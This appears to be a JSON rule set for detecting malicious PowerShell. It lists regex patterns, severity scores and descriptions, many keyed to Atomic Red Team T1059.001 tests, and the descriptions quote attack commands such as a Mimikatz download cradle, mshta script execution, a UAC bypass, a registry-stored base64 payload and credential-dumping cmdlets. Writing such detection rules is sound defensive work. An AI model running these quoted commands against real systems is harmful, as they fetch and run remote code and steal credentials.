[
  {
    "name": "ASPX FILE REFERENCE",
    "regex": "\\.aspx",
    "flags": "i",
    "score": 75,
    "severity": "high",
    "description": "References to ASPX files, commonly used in web shells and malicious uploads",
    "category": "ASPX FILE REFERENCE"
  },
  {
    "name": "BASE64 TO STRING CONVERTION",
    "regex": "(\\[System\\.Convert\\]::FromBase64String|FromBase64String|\\[Convert\\]::FromBase64String)",
    "flags": "i",
    "score": 80,
    "severity": "high",
    "description": "Base64 string conversion operations, often used to decode malicious payloads",
    "category": "BASE64 TO STRING CONVERTION"
  },
  {
    "name": "ENCODED COMMAND",
    "regex": "(-EncodedCommand|-enc|-e\\s)",
    "flags": "i",
    "score": 85,
    "severity": "critical",
    "description": "PowerShell encoded command execution, commonly used to bypass detection",
    "category": "ENCODED COMMAND"
  },
  {
    "name": "FAIRLY SUSPICIOUS KEYWORDS",
    "regex": "(mimikatz|sekurlsa|logonpasswords|-WindowStyle\\s+Hidden|-w\\s+hidden|WindowStyle.*Hidden|-ExecutionPolicy\\s+Bypass|-ep\\s+bypass|ExecutionPolicy.*Bypass|DownloadString|DownloadFile|WebClient|Invoke-WebRequest.*OutFile|IWR.*OutFile|Get-Credential|Export-Clixml.*cred|Import-Clixml.*cred)",
    "flags": "i",
    "score": 80,
    "severity": "high",
    "description": "Collection of suspicious PowerShell keywords and patterns commonly used in malicious activities",
    "category": "FAIRLY SUSPICIUS KEYWORDS"
  },
  {
    "name": "LONG BASE64 STRING",
    "regex": "[A-Za-z0-9+/]{100,}={0,2}",
    "flags": "g",
    "score": 70,
    "severity": "medium",
    "description": "Long Base64 encoded strings, potentially containing encoded payloads",
    "category": "LONG BASE64 STRING"
  },
  {
    "name": "TEXT.ENCODING AND BASE64 STRING MANIPULATION",
    "regex": "(\\[System\\.Text\\.Encoding\\]::UTF8|\\[Text\\.Encoding\\]::UTF8|\\[System\\.Text\\.Encoding\\]::Unicode|\\[Text\\.Encoding\\]::Unicode|\\[System\\.Text\\.Encoding\\]::ASCII|\\.GetString\\(.*FromBase64String)",
    "flags": "i",
    "score": 80,
    "severity": "high",
    "description": "Text encoding manipulation combined with Base64 operations, commonly used in payload obfuscation",
    "category": "tEXT.eNCODING AND BASE64 STRING MANIPULATION"
  },
  {
    "name": "ATOMIC T1059.001 - Test #1: Mimikatz Download and Execute",
    "regex": "(IEX.*\\(New-Object.*Net\\.WebClient\\)\\.DownloadString.*Invoke-Mimikatz|powershell\\.exe.*IEX.*New-Object.*Net\\.WebClient.*DownloadString.*Invoke-Mimikatz|Invoke-Mimikatz.*-DumpCreds)",
    "flags": "i",
    "score": 100,
    "severity": "critical",
    "description": "Downloads and executes Mimikatz via PowerShell download cradle - powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('URL'); Invoke-Mimikatz -DumpCreds\" (Atomic Test #1)",
    "category": "MIMIKATZ EXECUTION"
  },
  {
    "name": "ATOMIC T1059.001 - Test #2: BloodHound from Local Disk",
    "regex": "(import-module.*SharpHound\\.ps1|Invoke-BloodHound.*-OutputDirectory.*\\$env:Temp|try.*Invoke-BloodHound.*catch.*exit)",
    "flags": "i",
    "score": 95,
    "severity": "critical",
    "description": "Executes BloodHound/SharpHound from local disk for AD enumeration - import-module SharpHound.ps1; Invoke-BloodHound -OutputDirectory $env:Temp (Atomic Test #2)",
    "category": "BLOODHOUND EXECUTION"
  },
  {
    "name": "ATOMIC T1059.001 - Test #3: BloodHound from Memory",
    "regex": "(IEX.*\\(New-Object.*Net\\.Webclient\\)\\.DownloadString.*SharpHound|write-host.*Remote download.*SharpHound.*into memory|DownloadString.*BloodHound.*Invoke-BloodHound)",
    "flags": "i",
    "score": 95,
    "severity": "critical", 
    "description": "Downloads and executes BloodHound directly from memory via download cradle - IEX (New-Object Net.Webclient).DownloadString('URL') (Atomic Test #3)",
    "category": "FILELESS BLOODHOUND"
  },
  {
    "name": "ATOMIC T1059.001 - Test #4: Mimikatz via PsSendKeys",
    "regex": "(\\$wshell=New-Object.*-ComObject.*WScript\\.Shell|\\$wshell\\.SendKeys|AppActivate.*\\$title|Windows\\.Forms\\.Clipboard|SendKeys.*mimikatz|invoke-mimikatz.*-dumpcr)",
    "flags": "i",
    "score": 90,
    "severity": "high",
    "description": "Executes Mimikatz using automated keystrokes via PsSendKeys technique - complex WScript.Shell automation (Atomic Test #4)",
    "category": "AUTOMATED EXECUTION"
  },
  {
    "name": "ATOMIC T1059.001 - Test #5: Invoke-AppPathBypass",
    "regex": "(IEX.*New-Object.*Net\\.WebClient.*DownloadString.*Invoke-AppPathBypass|Invoke-AppPathBypass.*-Payload.*cmd\\.exe|enigma0x3.*Invoke-AppPathBypass)",
    "flags": "i",
    "score": 85,
    "severity": "high",
    "description": "UAC bypass technique using application paths - Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe' (Atomic Test #5)",
    "category": "UAC BYPASS"
  },
  {
    "name": "ATOMIC T1059.001 - Test #6: MsXml COM Object",
    "regex": "(\\$comMsXml=New-Object.*-ComObject.*MsXml2\\.ServerXmlHttp|\\$comMsXml\\.Open.*GET|\\$comMsXml\\.Send\\(\\)|IEX.*\\$comMsXml\\.ResponseText)",
    "flags": "i",
    "score": 80,
    "severity": "high",
    "description": "Uses MsXml COM object for web requests and payload execution - MsXml2.ServerXmlHttp download cradle (Atomic Test #6)",
    "category": "COM OBJECT ABUSE"
  },
  {
    "name": "ATOMIC T1059.001 - Test #7: PowerShell XML Requests",
    "regex": "(\\$Xml.*=.*New-Object.*System\\.Xml\\.XmlDocument|\\$Xml\\.Load.*http|\\$Xml\\.command\\.a\\.execute.*IEX)",
    "flags": "i",
    "score": 75,
    "severity": "medium",
    "description": "Downloads and executes payload via XML document parsing - $Xml.Load('URL'); $Xml.command.a.execute | IEX (Atomic Test #7)",
    "category": "XML PAYLOAD EXECUTION"
  },
  {
    "name": "ATOMIC T1059.001 - Test #8: PowerShell Invoke MSHTA",
    "regex": "(mshta\\.exe.*javascript:.*GetObject.*script:|cmd\\.exe.*\\/c.*mshta\\.exe.*javascript.*GetObject.*script)",
    "flags": "i",
    "score": 90,
    "severity": "high",
    "description": "Uses MSHTA to execute JavaScript that downloads and runs PowerShell payload - mshta.exe javascript:GetObject('script:URL') (Atomic Test #8)",
    "category": "MSHTA PAYLOAD EXECUTION"
  },
  {
    "name": "ATOMIC T1059.001 - Test #9: Invoke-DownloadCradle",
    "regex": "(Invoke-DownloadCradle\\.ps1|Invoke-DownloadCradle)",
    "flags": "i",
    "score": 85,
    "severity": "high",
    "description": "Uses various download cradle techniques for payload delivery - Invoke-DownloadCradle (Atomic Test #9)",
    "category": "DOWNLOAD CRADLE"
  },
  {
    "name": "ATOMIC T1059.001 - Test #10: Fileless Script Execution",
    "regex": "(reg\\.exe.*add.*HKEY_CURRENT_USER.*Software.*Classes.*AtomicRedTeam|iex.*\\[Text\\.Encoding\\]::ASCII\\.GetString.*\\[Convert\\]::FromBase64String.*gp.*HKCU.*Software.*Classes|U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0)",
    "flags": "i",
    "score": 95,
    "severity": "critical",
    "description": "Executes PowerShell payload stored in Windows Registry - reg.exe add + iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:Software\\Classes\\AtomicRedTeam').ART))) (Atomic Test #10)",
    "category": "REGISTRY PAYLOAD EXECUTION"
  },
  {
    "name": "ATOMIC T1059.001 - Test #11: NTFS Alternate Data Stream",
    "regex": "(Add-Content.*-Path.*-Value.*-Stream.*streamCommand|Get-Content.*-Path.*-Stream.*streamcommand|Invoke-Expression.*\\$streamcommand)",
    "flags": "i",
    "score": 90,
    "severity": "high",
    "description": "Stores and executes PowerShell code in NTFS Alternate Data Streams - Add-Content -Stream 'streamCommand'; Get-Content -Stream 'streamcommand' (Atomic Test #11)",
    "category": "ADS EXECUTION"
  },
  {
    "name": "ATOMIC T1059.001 - Test #12: PowerShell Session Creation",
    "regex": "(New-PSSession.*-ComputerName.*\\$env:COMPUTERNAME|Test-Connection.*\\$env:COMPUTERNAME|T1086.*PowerShell.*Session.*Creation)",
    "flags": "i",
    "score": 70,
    "severity": "medium",
    "description": "Creates and uses remote PowerShell sessions - New-PSSession -ComputerName; Test-Connection $env:COMPUTERNAME (Atomic Test #12)",
    "category": "REMOTE POWERSHELL"
  },
  {
    "name": "ATOMIC T1059.001 - Test #13-16: Command Parameter Variations",
    "regex": "(Out-ATHPowerShellCommandLineParameter.*-CommandLineSwitchType|Out-ATHPowerShellCommandLineParameter.*-CommandParamVariation|Out-ATHPowerShellCommandLineParameter.*-EncodedCommandParamVariation|Out-ATHPowerShellCommandLineParameter.*-UseEncodedArguments)",
    "flags": "i",
    "score": 75,
    "severity": "medium",
    "description": "Tests various PowerShell command-line parameter variations - Out-ATHPowerShellCommandLineParameter with various switches (Atomic Tests #13-16)",
    "category": "PARAMETER VARIATION"
  },
  {
    "name": "ATOMIC T1059.001 - Test #17: Obfuscated PowerShell Execution",
    "regex": "(JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==|powershell\\.exe.*-e.*[A-Za-z0-9+/]{50,})",
    "flags": "i",
    "score": 95,
    "severity": "critical",
    "description": "Executes heavily obfuscated PowerShell commands using Base64 encoding - powershell.exe -e {base64_encoded_payload} (Atomic Test #17)",
    "category": "OBFUSCATED EXECUTION"
  },
  {
    "name": "ATOMIC T1059.001 - Test #18: Malicious Cmdlets Simulation",
    "regex": "(Add-Persistence|Find-AVSignature|Get-GPPAutologon|Get-GPPPassword|Get-HttpStatus|Get-Keystrokes|Get-SecurityPackages|Get-TimedScreenshot|Get-VaultCredential|Get-VolumeShadowCopy|Install-SSP|Invoke-CredentialInjection|Invoke-DllInjection|Invoke-Mimikatz|Invoke-NinjaCopy|Invoke-Portscan|Invoke-ReflectivePEInjection|Invoke-ReverseDnsLookup|Invoke-Shellcode|Invoke-TokenManipulation|Invoke-WmiCommand|Mount-VolumeShadowCopy|New-ElevatedPersistenceOption|New-UserPersistenceOption|New-VolumeShadowCopy|Out-CompressedDll|Out-EncodedCommand|Out-EncryptedScript|Out-Minidump|PowerUp|PowerView|Remove-Comments|Remove-VolumeShadowCopy|Set-CriticalProcess|Set-MasterBootRecord)",
    "flags": "i",
    "score": 100,
    "severity": "critical",
    "description": "Execution of known malicious PowerShell cmdlets from offensive frameworks - simulation of PowerSploit/Empire/Cobalt Strike cmdlets (Atomic Test #18)",
    "category": "MALICIOUS CMDLETS"
  },
  {
    "name": "ATOMIC T1059.001 - Test #19: PowerUp Invoke-AllChecks",
    "regex": "(\\[Net\\.ServicePointManager\\]::SecurityProtocol.*Tls12.*iex.*iwr.*PowerSploit.*PowerUp|iex.*iwr.*PowerSploit.*d943001a7defb5e0d1657085a77a0e78609be58f.*Privesc.*PowerUp|Invoke-AllChecks)",
    "flags": "i",
    "score": 95,
    "severity": "critical",
    "description": "Runs PowerUp privilege escalation checks - iex(iwr PowerSploit/PowerUp.ps1); Invoke-AllChecks (Atomic Test #19)",
    "category": "PRIVILEGE ESCALATION"
  },
  {
    "name": "ATOMIC T1059.001 - Test #20: DNS Nslookup Abuse",
    "regex": "(function.*nslookup.*nslookup\\.exe.*Out-Null|powershell.*nslookup.*-q=txt.*\\[-1\\]|nslookup.*-q=txt.*example\\.com.*8\\.8\\.8\\.8)",
    "flags": "i",
    "score": 85,
    "severity": "high",
    "description": "Abuses nslookup and DNS TXT records for command execution - powershell .(nslookup -q=txt example.com 8.8.8.8)[-1] (Atomic Test #20)",
    "category": "DNS ABUSE"
  },
  {
    "name": "ATOMIC T1059.001 - Test #21: SOAPHound BloodHound Data Dump",
    "regex": "(SOAPHound\\.exe.*--user.*--password.*--domain.*--dc.*--bhdump|SOAPHound.*--bhdump.*--cachefilename.*--outputdirectory)",
    "flags": "i",
    "score": 90,
    "severity": "high",
    "description": "Uses SOAPHound to dump BloodHound data for AD reconnaissance - SOAPHound.exe --bhdump --outputdirectory (Atomic Test #21)",
    "category": "AD ENUMERATION"
  },
  {
    "name": "ATOMIC T1059.001 - Test #22: SOAPHound Cache Building",
    "regex": "(SOAPHound\\.exe.*--user.*--password.*--dc.*--buildcache|SOAPHound.*--buildcache.*--cachefilename)",
    "flags": "i",
    "score": 85,
    "severity": "high",
    "description": "Uses SOAPHound to build enumeration cache for Active Directory - SOAPHound.exe --buildcache --cachefilename (Atomic Test #22)",
    "category": "AD CACHE BUILDING"
  },
  {
    "name": "DOWNLOAD CRADLE PATTERNS",
    "regex": "(IEX.*\\(New-Object.*Net\\.WebClient\\)\\.DownloadString|IEX.*\\(iwr.*\\)\\.Content|\\(New-Object.*System\\.Net\\.WebClient\\)\\.DownloadString|iex.*\\(curl.*\\)|Invoke-Expression.*DownloadString)",
    "flags": "i",
    "score": 85,
    "severity": "high",
    "description": "Common PowerShell download cradle patterns used to fetch and execute remote payloads",
    "category": "DOWNLOAD CRADLE PATTERNS"
  },
  {
    "name": "REGISTRY PERSISTENCE TECHNIQUES",
    "regex": "(HKEY_CURRENT_USER.*Software.*Microsoft.*Windows.*CurrentVersion.*Run|HKCU:.*Software.*Microsoft.*Windows.*CurrentVersion.*Run|reg\\.exe.*add.*Run.*powershell)",
    "flags": "i",
    "score": 80,
    "severity": "high",
    "description": "Registry-based persistence techniques often used by malware for autostart",
    "category": "REGISTRY PERSISTENCE"
  },
  {
    "name": "BYPASS EXECUTION POLICY",
    "regex": "(-ExecutionPolicy.*Bypass|-ep.*bypass|-exec.*bypass|Set-ExecutionPolicy.*Bypass)",
    "flags": "i",
    "score": 75,
    "severity": "medium",
    "description": "PowerShell execution policy bypass techniques",
    "category": "EXECUTION POLICY BYPASS"
  },
  {
    "name": "WINDOW STYLE HIDDEN",
    "regex": "(-WindowStyle.*Hidden|-w.*hidden|WindowStyle.*Hidden)",
    "flags": "i",
    "score": 70,
    "severity": "medium",
    "description": "PowerShell executed with hidden window style to avoid detection",
    "category": "STEALTH EXECUTION"
  },
  {
    "name": "COMPLEX OBFUSCATION PATTERNS",
    "regex": "(\\$\\([^)]{50,}\\)|\\[char\\]\\d+.*\\+.*\\[char\\]\\d+|\\[\\w+\\]\\$\\(.*\\)|\\&.*\\(.*\\w.*\\).*\\(.*\\))",
    "flags": "i",
    "score": 80,
    "severity": "high",
    "description": "Complex PowerShell obfuscation patterns including character substitution and expression evaluation",
    "category": "ADVANCED OBFUSCATION"
  },
  {
    "name": "FILELESS EXECUTION INDICATORS",
    "regex": "(Invoke-Expression.*FromBase64String|iex.*Convert.*FromBase64String|\\[Text\\.Encoding\\].*GetString.*\\[Convert\\]::FromBase64String)",
    "flags": "i",
    "score": 85,
    "severity": "high",
    "description": "Fileless execution patterns using Base64 decoded content",
    "category": "FILELESS EXECUTION"
  },
  {
    "name": "CREDENTIAL HARVESTING INDICATORS",
    "regex": "(Get-Credential|ConvertTo-SecureString.*AsPlainText|Export-Clixml.*credential|Import-Clixml.*credential)",
    "flags": "i",
    "score": 80,
    "severity": "high",
    "description": "PowerShell credential harvesting and manipulation techniques",
    "category": "CREDENTIAL HARVESTING"
  }
]
